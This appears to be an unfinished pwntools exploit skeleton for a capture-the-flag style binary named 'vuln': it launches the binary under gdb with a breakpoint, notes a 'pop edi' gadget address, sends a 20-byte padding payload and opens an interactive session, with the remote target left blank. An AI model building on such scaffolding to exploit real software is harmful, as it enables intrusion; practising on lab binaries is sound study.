from pwn import *

exe = ELF("./vuln")

if args.LOCAL:
    r = process(exe.path)
    gdb.attach(r, gdbscript='''
               b*vuln+42
               c
               ''')
else:
    r = remote()
input()
pop_edi = 0x00001502

payload = b'a'*20
r.sendlineafter(b'Input: ', payload)
r.interactive()
